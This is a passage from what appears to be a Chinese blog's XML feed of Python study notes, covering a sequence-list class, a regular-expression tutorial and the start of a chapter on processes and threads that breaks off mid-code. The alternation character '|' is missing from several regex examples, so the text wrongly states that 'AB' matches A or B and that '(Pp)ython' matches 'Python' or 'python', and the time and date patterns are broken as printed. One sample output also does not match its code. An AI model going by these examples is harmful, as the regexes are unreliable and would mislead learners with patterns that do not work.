创建顺序表</span><br><span class="line">    def CreateSeqList(self):</span><br><span class="line">        element = input(&quot;please enter(input #:end):&quot;)</span><br><span class="line">        while element != &#x27;#&#x27;:</span><br><span class="line">            self.seqList.append(int(element))</span><br><span class="line">            element = input(&quot;please enter(input #:end):&quot;)</span><br><span class="line"></span><br><span class="line">    # 查找顺序表中某一个元素</span><br><span class="line">    def FindElement(self):</span><br><span class="line">        key = int(input(&quot;please enter what you want to find:&quot;))</span><br><span class="line">        if key in self.seqList:</span><br><span class="line">            keyPosition = self.seqList.index(key)</span><br><span class="line">            result = keyPosition</span><br><span class="line">        else:</span><br><span class="line">            result = &quot;none&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    # 在指定位置上插入元素</span><br><span class="line">    def InsertElement(self):</span><br><span class="line">        postion = int(input(&quot;请输入要插入的位置：&quot;))</span><br><span class="line">        key = int(input(&quot;请输入要插入的值：&quot;))</span><br><span class="line">        print(&quot;插入前顺序：&quot;, self.seqList)</span><br><span class="line">        self.seqList.insert(postion, key)</span><br><span class="line">        print(&quot;插入后顺序：&quot;, self.seqList)</span><br><span class="line"></span><br><span class="line">    # 在指定位置上删除元素</span><br><span class="line">    def DeleteElement(self):</span><br><span class="line">        postion = int(input(&quot;请输入要删除元素的位置：&quot;))</span><br><span class="line">        print(&quot;删除前的顺序表：&quot;, self.seqList)</span><br><span class="line">        if postion &lt; len(self.seqList) and postion &gt;= 0:</span><br><span class="line">            del self.seqList[postion]</span><br><span class="line">            return self.seqList</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;不存在啊老铁，删除个毛线啊&quot;)</span><br><span class="line"></span><br><span class="line">    # 遍历顺序表元素</span><br><span class="line">    def TraverseElement(self):</span><br><span class="line">        for i in range(len(self.seqList)):</span><br><span class="line">            print(self.seqList[i], end =&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">    # 判空</span><br><span class="line">    def IsEmpty(self):</span><br><span class="line">        return len(self.seqList) == 0</span><br><span class="line"></span><br><span class="line">    # 销毁顺序表</span><br><span class="line">    def DestorySeqList(self):</span><br><span class="line">        print(&quot;销毁前顺序表：&quot;, self.seqList)</span><br><span class="line">        self.__init__()</span><br><span class="line">        print(&quot;销毁后顺序表：&quot;, self.seqList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    list = SequenceList()</span><br><span class="line">    list.CreateSeqList()</span><br><span class="line">    print(list.seqList)</span><br><span class="line">    print(list.FindElement())</span><br><span class="line">    list.InsertElement()</span><br><span class="line">    list.DeleteElement()</span><br><span class="line">    list.TraverseElement()</span><br><span class="line">    list.IsEmpty()</span><br><span class="line">    list.DestorySeqList()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 顺序表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(十一)·正则表达式</title>
      <link href="/105.html"/>
      <url>/105.html</url>
      
        <content type="html"><![CDATA[<p>字符串是编程时涉及到的最多的一种数据结构，对字符串进行操作的需求几乎无处不在。比如判断一个字符串是否是合法的Email地址，虽然可以编程提取<code>@</code>前后的子串，再分别判断是否是单词和域名，但这样做不但麻烦，而且代码难以复用。</p><p>正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则，凡是符合规则的字符串，我们就认为它“匹配”了，否则，该字符串就是不合法的。</p><p>所以我们判断一个字符串是否是合法的Email的方法是：</p><ol><li>创建一个匹配Email的正则表达式；</li><li>用该正则表达式去匹配用户的输入来判断是否合法。</li></ol><p>因为正则表达式也是用字符串表示的，所以，我们要首先了解如何用字符来描述字符。</p><p>在正则表达式中，如果直接给出字符，就是精确匹配。用<code>\d</code>可以匹配一个数字，<code>\w</code>可以匹配一个字母或数字，所以：</p><ul><li><code>&#39;00\d&#39;</code>可以匹配<code>&#39;007&#39;</code>，但无法匹配<code>&#39;00A&#39;</code>；</li><li><code>&#39;\d\d\d&#39;</code>可以匹配<code>&#39;010&#39;</code>；</li><li><code>&#39;\w\w\d&#39;</code>可以匹配<code>&#39;py3&#39;</code>；</li></ul><p><code>.</code>可以匹配任意字符，所以：</p><ul><li><code>&#39;py.&#39;</code>可以匹配<code>&#39;pyc&#39;</code>、<code>&#39;pyo&#39;</code>、<code>&#39;py!&#39;</code>等等。</li></ul><p>要匹配变长的字符，在正则表达式中，用<code>*</code>表示任意个字符（包括0个），用<code>+</code>表示至少一个字符，用<code>?</code>表示0个或1个字符，用<code>&#123;n&#125;</code>表示n个字符，用<code>&#123;n,m&#125;</code>表示n-m个字符：</p><p>来看一个复杂的例子：<code>\d&#123;3&#125;\s+\d&#123;3,8&#125;</code>。</p><p>我们来从左到右解读一下：</p><ol><li><code>\d&#123;3&#125;</code>表示匹配3个数字，例如<code>&#39;010&#39;</code>；</li><li><code>\s</code>可以匹配一个空格（也包括Tab等空白符），所以<code>\s+</code>表示至少有一个空格，例如匹配<code>&#39; &#39;</code>，<code>&#39; &#39;</code>等；</li><li><code>\d&#123;3,8&#125;</code>表示3-8个数字，例如<code>&#39;1234567&#39;</code>。</li></ol><p>综合起来，上面的正则表达式可以匹配以任意个空格隔开的带区号的电话号码。</p><p>如果要匹配<code>&#39;010-12345&#39;</code>这样的号码呢？由于<code>&#39;-&#39;</code>是特殊字符，在正则表达式中，要用<code>&#39;\&#39;</code>转义，所以，上面的正则是<code>\d&#123;3&#125;\-\d&#123;3,8&#125;</code>。</p><p>但是，仍然无法匹配<code>&#39;010 - 12345&#39;</code>，因为带有空格。所以我们需要更复杂的匹配方式。</p><h2 id="11-1-进阶"><a href="#11-1-进阶" class="headerlink" title="11.1 进阶"></a>11.1 进阶</h2><p>要做更精确地匹配，可以用<code>[]</code>表示范围，比如：</p><ul><li><code>[0-9a-zA-Z\_]</code>可以匹配一个数字、字母或者下划线；</li><li><code>[0-9a-zA-Z\_]+</code>可以匹配至少由一个数字、字母或者下划线组成的字符串，比如<code>&#39;a100&#39;</code>，<code>&#39;0_Z&#39;</code>，<code>&#39;Py3000&#39;</code>等等；</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]*</code>可以匹配由字母或下划线开头，后接任意个由一个数字、字母或者下划线组成的字符串，也就是Python合法的变量；</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]&#123;0, 19&#125;</code>更精确地限制了变量的长度是1-20个字符（前面1个字符+后面最多19个字符）。</li></ul><p><code>AB</code>可以匹配A或B，所以<code>(Pp)ython</code>可以匹配<code>&#39;Python&#39;</code>或者<code>&#39;python&#39;</code>。</p><p><code>^</code>表示行的开头，<code>^\d</code>表示必须以数字开头。</p><p><code>$</code>表示行的结束，<code>\d$</code>表示必须以数字结束。</p><p>你可能注意到了，<code>py</code>也可以匹配<code>&#39;python&#39;</code>，但是加上<code>^py$</code>就变成了整行匹配，就只能匹配<code>&#39;py&#39;</code>了。</p><h2 id="11-2-re-模块"><a href="#11-2-re-模块" class="headerlink" title="11.2 re 模块"></a>11.2 re 模块</h2><p>有了准备知识，我们就可以在Python中使用正则表达式了。Python提供<code>re</code>模块，包含所有正则表达式的功能。由于Python的字符串本身也用<code>\</code>转义，所以要特别注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = &#x27;ABC\\-001&#x27; # Python的字符串</span><br><span class="line"># 对应的正则表达式字符串变成：</span><br><span class="line"># &#x27;ABC\-001&#x27;</span><br></pre></td></tr></table></figure><p>因此我们强烈建议使用Python的<code>r</code>前缀，就不用考虑转义的问题了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = r&#x27;ABC\-001&#x27; # Python的字符串</span><br><span class="line"># 对应的正则表达式字符串不变：</span><br><span class="line"># &#x27;ABC\-001&#x27;</span><br></pre></td></tr></table></figure><p>先看看如何判断正则表达式是否匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; re.match(r&#x27;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#x27;, &#x27;010-12345&#x27;)</span><br><span class="line">&lt;_sre.SRE_Match object; span=(0, 9), match=&#x27;010-12345&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; re.match(r&#x27;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#x27;, &#x27;010 12345&#x27;)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p><code>match()</code>方法判断是否匹配，如果匹配成功，返回一个<code>Match</code>对象，否则返回<code>None</code>。常见的判断方法就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test = &#x27;用户输入的字符串&#x27;</span><br><span class="line">if re.match(r&#x27;正则表达式&#x27;, test):</span><br><span class="line">    print(&#x27;ok&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;failed&#x27;)</span><br></pre></td></tr></table></figure><h2 id="11-3-切分字符串"><a href="#11-3-切分字符串" class="headerlink" title="11.3 切分字符串"></a>11.3 切分字符串</h2><p>用正则表达式切分字符串比用固定的字符更灵活，请看正常的切分代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;a b   c&#x27;.split(&#x27; &#x27;)</span><br><span class="line">[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;c&#x27;]</span><br></pre></td></tr></table></figure><p>嗯，无法识别连续的空格，用正则表达式试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.split(r&#x27;\s+&#x27;, &#x27;a b   c&#x27;)</span><br><span class="line">[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span><br></pre></td></tr></table></figure><p>无论多少个空格都可以正常分割。加入<code>,</code>试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.split(r&#x27;[\s\,]+&#x27;, &#x27;a,b, c  d&#x27;)</span><br><span class="line">[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;]</span><br></pre></td></tr></table></figure><p>再加入<code>;</code>试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.split(r&#x27;[\s\,\;]+&#x27;, &#x27;a,b;; c  d&#x27;)</span><br><span class="line">[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;]</span><br></pre></td></tr></table></figure><p>如果用户输入了一组标签，下次记得用正则表达式来把不规范的输入转化成正确的数组。</p><h2 id="11-4-分组"><a href="#11-4-分组" class="headerlink" title="11.4 分组"></a>11.4 分组</h2><p>除了简单地判断是否匹配之外，正则表达式还有提取子串的强大功能。用<code>()</code>表示的就是要提取的分组（Group）。比如：</p><p><code>^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$</code>分别定义了两个组，可以直接从匹配的字符串中提取出区号和本地号码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; m = re.match(r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;, &#x27;010-12345&#x27;)</span><br><span class="line">&gt;&gt;&gt; m</span><br><span class="line">&lt;_sre.SRE_Match object; span=(0, 9), match=&#x27;010-12345&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; m.group(0)</span><br><span class="line">&#x27;010-12345&#x27;</span><br><span class="line">&gt;&gt;&gt; m.group(1)</span><br><span class="line">&#x27;010&#x27;</span><br><span class="line">&gt;&gt;&gt; m.group(2)</span><br><span class="line">&#x27;12345&#x27;</span><br></pre></td></tr></table></figure><p>如果正则表达式中定义了组，就可以在<code>Match</code>对象上用<code>group()</code>方法提取出子串来。</p><p>注意到<code>group(0)</code>永远是原始字符串，<code>group(1)</code>、<code>group(2)</code>……表示第1、2、……个子串。</p><p>提取子串非常有用。来看一个更凶残的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; t = &#x27;19:05:30&#x27;</span><br><span class="line">&gt;&gt;&gt; m = re.match(r&#x27;^(0[0-9]1[0-9]2[0-3][0-9])\:(0[0-9]1[0-9]2[0-9]3[0-9]4[0-9]5[0-9][0-9])\:(0[0-9]1[0-9]2[0-9]3[0-9]4[0-9]5[0-9][0-9])$&#x27;, t)</span><br><span class="line">&gt;&gt;&gt; m.groups()</span><br><span class="line">(&#x27;19&#x27;, &#x27;05&#x27;, &#x27;30&#x27;)</span><br></pre></td></tr></table></figure><p>这个正则表达式可以直接识别合法的时间。但是有些时候，用正则表达式也无法做到完全验证，比如识别日期：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;^(0[1-9]1[0-2][0-9])-(0[1-9]1[0-9]2[0-9]3[0-1][0-9])$&#x27;</span><br></pre></td></tr></table></figure><p>对于<code>&#39;2-30&#39;</code>，<code>&#39;4-31&#39;</code>这样的非法日期，用正则还是识别不了，或者说写出来非常困难，这时就需要程序配合识别了。</p><h2 id="11-5-贪婪匹配"><a href="#11-5-贪婪匹配" class="headerlink" title="11.5 贪婪匹配"></a>11.5 贪婪匹配</h2><p>最后需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的<code>0</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&#x27;^(\d+)(0*)$&#x27;, &#x27;102300&#x27;).groups()</span><br><span class="line">(&#x27;102300&#x27;, &#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>由于<code>\d+</code>采用贪婪匹配，直接把后面的<code>0</code>全部匹配了，结果<code>0*</code>只能匹配空字符串了。</p><p>必须让<code>\d+</code>采用非贪婪匹配（也就是尽可能少匹配），才能把后面的<code>0</code>匹配出来，加个<code>?</code>就可以让<code>\d+</code>采用非贪婪匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&#x27;^(\d+?)(0*)$&#x27;, &#x27;102300&#x27;).groups()</span><br><span class="line">(&#x27;1023&#x27;, &#x27;00&#x27;)</span><br></pre></td></tr></table></figure><h2 id="11-6-编译"><a href="#11-6-编译" class="headerlink" title="11.6 编译"></a>11.6 编译</h2><p>当我们在Python中使用正则表达式时，re模块内部会干两件事情：</p><ol><li>编译正则表达式，如果正则表达式的字符串本身不合法，会报错；</li><li>用编译后的正则表达式去匹配字符串。</li></ol><p>如果一个正则表达式要重复使用几千次，出于效率的考虑，我们可以预编译该正则表达式，接下来重复使用时就不需要编译这个步骤了，直接匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line"># 编译:</span><br><span class="line">&gt;&gt;&gt; re_telephone = re.compile(r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;)</span><br><span class="line"># 使用：</span><br><span class="line">&gt;&gt;&gt; re_telephone.match(&#x27;010-12345&#x27;).groups()</span><br><span class="line">(&#x27;010&#x27;, &#x27;12345&#x27;)</span><br><span class="line">&gt;&gt;&gt; re_telephone.match(&#x27;010-8086&#x27;).groups()</span><br><span class="line">(&#x27;010&#x27;, &#x27;8086&#x27;)</span><br></pre></td></tr></table></figure><p>编译后生成Regular Expression对象，由于该对象自己包含了正则表达式，所以调用对应的方法时不用给出正则字符串。</p><blockquote><p>小结：</p></blockquote><p>正则表达式非常强大，要在短短的一节里讲完是不可能的。要讲清楚正则的所有内容，可以写一本厚厚的书了。如果你经常遇到正则表达式的问题，你可能需要一本正则表达式的参考书。</p><h2 id="11-7-参考资料"><a href="#11-7-参考资料" class="headerlink" title="11.7 参考资料"></a>11.7 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017639890281664">廖雪峰 - Python 3.x - 正则表达式</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(十)·进程和线程</title>
      <link href="/103.html"/>
      <url>/103.html</url>
      
        <content type="html"><![CDATA[<p>很多同学都听说过，现代操作系统比如Mac OS X，UNIX，Linux，Windows等，都是支持“多任务”的操作系统。</p><p>什么叫“多任务”呢？简单地说，就是操作系统可以同时运行多个任务。打个比方，你一边在用浏览器上网，一边在听MP3，一边在用Word赶作业，这就是多任务，至少同时有3个任务正在运行。还有很多任务悄悄地在后台同时运行着，只是桌面上没有显示而已。</p><p>现在，多核CPU已经非常普及了，但是，即使过去的单核CPU，也可以执行多任务。由于CPU执行代码都是顺序执行的，那么，单核CPU是怎么执行多任务的呢？</p><p>答案就是操作系统轮流让各个任务交替执行，任务1执行0.01秒，切换到任务2，任务2执行0.01秒，再切换到任务3，执行0.01秒……这样反复执行下去。表面上看，每个任务都是交替执行的，但是，由于CPU的执行速度实在是太快了，我们感觉就像所有任务都在同时执行一样。</p><p>真正的并行执行多任务只能在多核CPU上实现，但是，由于任务数量远远多于CPU的核心数量，所以，操作系统也会自动把很多任务轮流调度到每个核心上执行。</p><p>对于操作系统来说，一个任务就是一个进程（Process），比如打开一个浏览器就是启动一个浏览器进程，打开一个记事本就启动了一个记事本进程，打开两个记事本就启动了两个记事本进程，打开一个Word就启动了一个Word进程。</p><p>有些进程还不止同时干一件事，比如Word，它可以同时进行打字、拼写检查、打印等事情。在一个进程内部，要同时干多件事，就需要同时运行多个“子任务”，我们把进程内的这些“子任务”称为线程（Thread）。</p><p>由于每个进程至少要干一件事，所以，一个进程至少有一个线程。当然，像Word这种复杂的进程可以有多个线程，多个线程可以同时执行，多线程的执行方式和多进程是一样的，也是由操作系统在多个线程之间快速切换，让每个线程都短暂地交替运行，看起来就像同时执行一样。当然，真正地同时执行多线程需要多核CPU才可能实现。</p><p>我们前面编写的所有的Python程序，都是执行单任务的进程，也就是只有一个线程。如果我们要同时执行多个任务怎么办？</p><p>有两种解决方案：</p><p>一种是启动多个进程，每个进程虽然只有一个线程，但多个进程可以一块执行多个任务。</p><p>还有一种方法是启动一个进程，在一个进程内启动多个线程，这样，多个线程也可以一块执行多个任务。</p><p>当然还有第三种方法，就是启动多个进程，每个进程再启动多个线程，这样同时执行的任务就更多了，当然这种模型更复杂，实际很少采用。</p><p>总结一下就是，多任务的实现有3种方式：</p><ul><li>多进程模式；</li><li>多线程模式；</li><li>多进程+多线程模式。</li></ul><p>同时执行多个任务通常各个任务之间并不是没有关联的，而是需要相互通信和协调，有时，任务1必须暂停等待任务2完成后才能继续执行，有时，任务3和任务4又不能同时执行，所以，多进程和多线程的程序的复杂度要远远高于我们前面写的单进程单线程的程序。</p><p>因为复杂度高，调试困难，所以，不是迫不得已，我们也不想编写多任务。但是，有很多时候，没有多任务还真不行。想想在电脑上看电影，就必须由一个线程播放视频，另一个线程播放音频，否则，单线程实现的话就只能先把视频播放完再播放音频，或者先把音频播放完再播放视频，这显然是不行的。</p><p>Python既支持多进程，又支持多线程，我们会讨论如何编写这两种多任务程序。</p><blockquote><p>小结：</p></blockquote><p>线程是最小的执行单元，而进程由至少一个线程组成。如何调度进程和线程，完全由操作系统决定，程序自己不能决定什么时候执行，执行多长时间。</p><p>多进程和多线程的程序涉及到同步、数据共享的问题，编写起来更复杂。</p><h2 id="10-1-多进程"><a href="#10-1-多进程" class="headerlink" title="10.1 多进程"></a>10.1 多进程</h2><p>要让Python程序实现多进程（multiprocessing），我们先了解操作系统的相关知识。</p><p>Unix&#x2F;Linux操作系统提供了一个<code>fork()</code>系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，但是<code>fork()</code>调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。</p><p>子进程永远返回<code>0</code>，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用<code>getppid()</code>就可以拿到父进程的ID。</p><p>Python的<code>os</code>模块封装了常见的系统调用，其中就包括<code>fork</code>，可以在Python程序中轻松创建子进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">print(&#x27;Process (%s) start...&#x27; % os.getpid())</span><br><span class="line"># Only works on Unix/Linux/Mac:</span><br><span class="line">pid = os.fork()</span><br><span class="line">if pid == 0:</span><br><span class="line">    print(&#x27;I am child process (%s) and my parent is %s.&#x27; % (os.getpid(), os.getppid()))</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;I (%s) just created a child process (%s).&#x27; % (os.getpid(), pid))</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Process (876) start...</span><br><span class="line">I (876) just created a child process (877).</span><br><span class="line">I am child process (877) and my parent is 876.</span><br></pre></td></tr></table></figure><p>由于Windows没有<code>fork</code>调用，上面的代码在Windows上无法运行。而Mac系统是基于BSD（Unix的一种）内核，所以，在Mac下运行是没有问题的，推荐大家用Mac学Python！</p><p>有了<code>fork</code>调用，一个进程在接到新任务时就可以复制出一个子进程来处理新任务，常见的Apache服务器就是由父进程监听端口，每当有新的http请求时，就fork出子进程来处理新的http请求。</p><h3 id="10-1-1-multiprocessing"><a href="#10-1-1-multiprocessing" class="headerlink" title="10.1.1 multiprocessing"></a>10.1.1 multiprocessing</h3><p>如果你打算编写多进程的服务程序，Unix&#x2F;Linux无疑是正确的选择。由于Windows没有<code>fork</code>调用，难道在Windows上无法用Python编写多进程的程序？</p><p>由于Python是跨平台的，自然也应该提供一个跨平台的多进程支持。<code>multiprocessing</code>模块就是跨平台版本的多进程模块。</p><p><code>multiprocessing</code>模块提供了一个<code>Process</code>类来代表一个进程对象，下面的例子演示了启动一个子进程并等待其结束：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from multiprocessing import Process</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 子进程要执行的代码</span><br><span class="line">def run_proc(name):</span><br><span class="line">    print(&#x27;Run child process %s (%s)...&#x27; % (name, os.getpid()))</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    print(&#x27;Parent process %s.&#x27; % os.getpid())</span><br><span class="line">    p = Process(target=run_proc, args=(&#x27;test&#x27;,))</span><br><span class="line">    print(&#x27;Child process will start.&#x27;)</span><br><span class="line">    p.start()</span><br><span class="line">    p.join()</span><br><span class="line">    print(&#x27;Child process end.&#x27;)</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Parent process 928.</span><br><span class="line">Child process will start.</span><br><span class="line">Run child process test (929)...</span><br><span class="line">Process end.</span><br></pre></td></tr></table></figure><p>创建子进程时，只需要传入一个执行函数和函数的参数，创建一个<code>Process</code>实例，用<code>start()</code>方法启动，这样创建进程比<code>fork()</code>还要简单。</p><p><code>join()</code>方法可以等待子进程结束后再继续往下运行，通常用于进程间的同步。</p><h3 id="10-1-2-Pool"><a href="#10-1-2-Pool" class="headerlink" title="10.1.2 Pool"></a>10.1.2 Pool</h3><p>如果要启动大量的子进程，可以用进程池的方式批量创建子进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from multiprocessing import Pool</span><br><span class="line">import os, time, random</span><br><span class="line"></span><br><span class="line">def long_time_task(name):</span><br><span class="line">    print(&#x27;Run task %s (%s)...&#x27; % (name, os.getpid()))</span><br><span class="line">    start = time.time()</span><br><span class="line">    time.sleep(random.random() * 3)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(&#x27;Task %s runs %0.2f seconds.&#x27; % (name, (end - start)))</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    print(&#x27;Parent process %s.&#x27; % os.getpid())</span><br><span class="line">    p = Pool(4)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        p.apply_async(long_time_task, args=(i,))</span><br><span class="line">    print(&#x27;Waiting for all subprocesses done...&#x27;)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(&#x27;All subprocesses done.&#x27;)</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Parent process 669.</span><br><span class="line">Waiting for all subprocesses done...</span><br><span class="line">Run task 0 (671)...</span><br><span class="line">Run task 1 (672)...</span><br><span class="line">Run task 2 (673)...</span><br><span class="line">Run task 3 (674)...</span><br><span class="line">Task 2 runs 0.14 seconds.</span><br><span class="line">Run task 4 (673)...</span><br><span class="line">Task 1 runs 0.27 seconds.</span><br><span class="line">Task 3 runs 0.86 seconds.</span><br><span class="line">Task 0 runs 1.41 seconds.</span><br><span class="line">Task 4 runs 1.91 seconds.</span><br><span class="line">All subprocesses done.</span><br></pre></td></tr></table></figure><p>代码解读：</p><p>对<code>Pool</code>对象调用<code>join()</code>方法会等待所有子进程执行完毕，调用<code>join()</code>之前必须先调用<code>close()</code>，调用<code>close()</code>之后就不能继续添加新的<code>Process</code>了。</p><p>请注意输出的结果，task <code>0</code>，<code>1</code>，<code>2</code>，<code>3</code>是立刻执行的，而task <code>4</code>要等待前面某个task完成后才执行，这是因为<code>Pool</code>的默认大小在我的电脑上是4，因此，最多同时执行4个进程。这是<code>Pool</code>有意设计的限制，并不是操作系统的限制。如果改成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = Pool(5)</span><br></pre></td></tr></table></figure><p>就可以同时跑5个进程。</p><p>由于<code>Pool</code>的默认大小是CPU的核数，如果你不幸拥有8核CPU，你要提交至少9个子进程才能看到上面的等待效果。</p><h3 id="10-1-3-子进程"><a href="#10-1-3-子进程" class="headerlink" title="10.1.3 子进程"></a>10.1.3 子进程</h3><p>很多时候，子进程并不是自身，而是一个外部进程。我们创建了子进程后，还需要控制子进程的输入和输出。</p><p><code>subprocess</code>模块可以让我们非常方便地启动一个子进程，然后控制其输入和输出。</p><p>下面的例子演示了如何在Python代码中运行命令<code>nslookup www.python.org</code>，这和命令行直接运行的效果是一样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import 